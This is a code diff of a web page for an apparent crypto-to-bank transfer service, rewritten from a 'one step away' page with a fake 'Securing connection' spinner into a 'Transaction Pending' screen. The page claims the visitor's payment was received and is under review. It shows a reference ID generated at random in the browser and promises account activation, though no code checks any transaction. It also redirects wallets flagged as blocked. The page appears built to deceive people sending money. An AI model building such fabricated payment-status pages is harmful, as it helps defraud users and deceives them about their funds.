@@ -3,76 +3,174 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto to Bank Transfer</title>
+    <title>Transaction Pending</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
-        h2 { font-size: 24px; margin-bottom: 15px; color: #38bdf8; }
-        p { color: #94a3b8; margin-bottom: 25px; font-size: 16px; line-height: 1.5; }
-        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .container { background-color: #1e293b; padding: 36px 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+
+        /* Icon */
+        .icon-wrap { width: 86px; height: 86px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: pulse 2.4s ease-in-out infinite; }
+        .icon-wrap svg { width: 40px; height: 40px; }
+        @keyframes pulse { 0%,100%{ box-shadow: 0 0 0 0 rgba(245,158,11,0.25); } 50%{ box-shadow: 0 0 0 14px rgba(245,158,11,0); } }
+
+        h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 8px; }
+        .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+        /* Status badge */
+        .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 20px; padding: 6px 16px; font-size: 12px; font-weight: 700; color: #f59e0b; letter-spacing: 0.06em; margin-bottom: 28px; }
+        .status-badge::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: #f59e0b; animation: blink 1.8s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+        /* Info card */
+        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin-bottom: 20px; text-align: left; }
+        .info-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #1e293b; }
+        .info-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .info-row:first-child { padding-top: 0; }
+        .info-label { font-size: 13px; color: #64748b; }
+        .info-value { font-size: 13px; color: #f8fafc; font-weight: 600; text-align: right; }
+        .info-value.amber { color: #f59e0b; }
+        .info-value.green { color: #4ade80; }
+
+        /* Timeline */
+        .timeline { text-align: left; margin-bottom: 24px; }
+        .timeline-title { font-size: 13px; font-weight: 600; color: #94a3b8; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.07em; }
+        .step { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 16px; }
+        .step:last-child { margin-bottom: 0; }
+        .step-dot-wrap { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
+        .step-dot { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; }
+        .step-dot.done { background: rgba(74, 222, 128, 0.15); border: 2px solid #4ade80; color: #4ade80; }
+        .step-dot.active { background: rgba(245, 158, 11, 0.15); border: 2px solid #f59e0b; color: #f59e0b; animation: blink 1.8s infinite; }
+        .step-dot.pending { background: rgba(51, 65, 85, 0.5); border: 2px solid #334155; color: #475569; }
+        .step-line { width: 2px; flex: 1; min-height: 16px; background: #1e293b; margin-top: 4px; }
+        .step-content { padding-top: 4px; }
+        .step-name { font-size: 13px; font-weight: 600; color: #f8fafc; margin-bottom: 2px; }
+        .step-desc { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+        /* Note */
+        .note-box { background-color: rgba(56, 189, 248, 0.06); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #7dd3fc; line-height: 1.6; text-align: left; margin-bottom: 24px; }
+        .note-box strong { color: #38bdf8; }
+
+        /* Button */
+        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
         .btn:hover { background-color: #1d4ed8; }
-        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30, 41, 59, 0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
-        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        .spinner-text { color: #94a3b8; font-size: 16px; font-weight: 500; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <div class="spinner-overlay" id="loading-spinner">
-        <div class="spinner"></div>
-        <div class="spinner-text" id="spinner-message">Processing...</div>
+
+    <div class="icon-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+        </svg>
     </div>
 
-    <div class="step">
-        <h2>You're one step away!</h2>
-        <p>You are just a few moments away from securely receiving your crypto straight into your local bank account.</p>
-        <button class="btn" onclick="triggerStep1Transition()">Proceed</button>
+    <h2>Transaction Pending</h2>
+    <p class="subtitle">Your payment has been received and is currently being reviewed. Please allow some time for processing.</p>
+
+    <div class="status-badge">PROCESSING</div>
+
+    <div class="info-card">
+        <div class="info-row">
+            <span class="info-label">Status</span>
+            <span class="info-value amber">Under Review</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Estimated Time</span>
+            <span class="info-value">1 – 3 Business Days</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Date Submitted</span>
+            <span class="info-value" id="submitted-date">—</span>
+        </div>
+        <div class="info-row">
+            <span class="info-label">Reference ID</span>
+            <span class="info-value" id="ref-id" style="font-family:'Courier New',monospace; font-size:12px;">—</span>
+        </div>
     </div>
+
+    <div class="timeline">
+        <div class="timeline-title">Progress</div>
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot done">✓</div>
+                <div class="step-line"></div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Payment Submitted</div>
+                <div class="step-desc">Your payment details have been received successfully.</div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot active">⋯</div>
+                <div class="step-line"></div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Under Review</div>
+                <div class="step-desc">Our team is verifying and processing your transaction. This may take 1–3 business days.</div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-dot-wrap">
+                <div class="step-dot pending">3</div>
+            </div>
+            <div class="step-content">
+                <div class="step-name">Account Activated</div>
+                <div class="step-desc">Your account will be fully activated once verification is complete.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="note-box">
+        <strong>ℹ️ What's next?</strong> You'll be notified once your transaction is confirmed. If you don't hear back within <strong>3 business days</strong>, please contact our support team with your Reference ID.
+    </div>
+
+    <button class="btn" onclick="window.location.href='withdraw.html'">Proceed →</button>
+
 </div>
 
 <script>
-    const SUPABASE_URL = "https://kmjmqrrmzdtovovzigxk.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb";
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
+    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
 
-    async function checkBlockedAndRedirect() {
+    // ── Check is_blocked; redirect to main.html if true ──────────────────────
+    async function checkBlocked() {
         const wallet = localStorage.getItem('active_wallet');
         if (!wallet) return;
-
-        const { data } = await supabaseClient
-            .from('crypto_transfers')
-            .select('is_blocked')
-            .eq('wallet_address', wallet)
-            .limit(1);
-
-        if (data && data[0]?.is_blocked) {
-            window.location.replace("pay.html");
+        try {
+            const { data, error } = await supabaseClient
+                .from('crypto_transfers')
+                .select('is_blocked')
+                .eq('wallet_address', wallet)
+                .limit(1);
+            if (error || !data || data.length === 0) return;
+            if (data[0].is_blocked) {
+                window.location.href = 'main.html';
+            }
+        } catch (err) {
+            console.error('Block check failed:', err);
         }
     }
 
-    function showSpinner(text, duration, callback) {
-        const spinner = document.getElementById('loading-spinner');
-        const spinnerText = document.getElementById('spinner-message');
-        spinnerText.innerText = text;
-        spinner.classList.add('active');
-        setTimeout(() => {
-            spinner.classList.remove('active');
-            if (callback) callback();
-        }, duration);
-    }
+    window.onload = function () {
+        checkBlocked();
 
-    function triggerStep1Transition() {
-        showSpinner("Securing connection...", 1500, () => {
-            window.location.href = "proceed.html";
-        });
-    }
+        // Generate reference ID
+        const refId = 'TXN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + Date.now().toString().slice(-4);
+        document.getElementById('ref-id').textContent = refId;
 
-    window.onload = checkBlockedAndRedirect;
+        // Set submitted date
+        const now = new Date();
+        const opts = { year: 'numeric', month: 'short', day: 'numeric' };
+        document.getElementById('submitted-date').textContent = now.toLocaleDateString('en-US', opts);
+    };
 </script>
 </body>
 </html>
